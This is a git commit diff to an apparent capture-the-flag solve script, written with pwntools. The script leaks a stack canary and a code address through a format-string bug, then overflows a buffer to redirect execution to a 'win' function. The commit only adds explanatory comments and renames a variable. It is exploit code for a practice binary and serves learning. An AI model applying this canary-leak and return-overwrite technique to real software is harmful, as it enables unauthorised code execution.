7ad5aa88c4dea80f1278a2b0d45ae1f47a927a77
gith-eng <135365698+gith-eng@users.noreply.github.com>
2026-04-19 20:20:32 +0200

    Comments
    Refactor canary and base index calculations for clarity and correctness.

--- canary/02_space_station/solve.py
+++ canary/02_space_station/solve.py
@@ -4,10 +4,16 @@ from pwn import *
 
 elf = context.binary = ELF("./space_station", checksec=False)
 
+#found by printing %p... as first input (value with last byte to 0)
 CANARY_IDX = 15
-OFFSET_TO_CANARY = 72
-OFFSET_TO_RIP = 88
+#found by printing %p... as first input (value starting with 0x555555)
+#points at something inside the .text code section
 BASE_IDX = 17
+
+#python3 -c "from pwn import *; print(cyclic(100)) as input + debug tofind canary offset
+OFFSET_TO_CANARY = 72
+#rip offset is canary offset + canary (8B) + saved RPB (8B)
+OFFSET_TO_RIP = 88
 ret = 0x000000000000101a
 
 
@@ -21,7 +27,9 @@ line = p.recvline().strip().split()
 leak = int(line[0], 16)
 canary = int(line[1], 16)
 
-pie_base = leak - 0x139e
+#offset = leaked address - base
+#base found with vmmap
+pie_offset = leak - 0x139e
 
 log.info(f"canary = {canary:#x}")
 p.recvuntil(b"log: ")
@@ -29,8 +37,8 @@ payload = flat(
 b"A" * OFFSET_TO_CANARY,
 p64(canary),
 b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
-p64(ret+pie_base),
-p64(elf.sym.win+pie_base),
+p64(ret+pie_offset),
+p64(elf.sym.win+pie_offset),
 )
 p.sendline(payload)
 
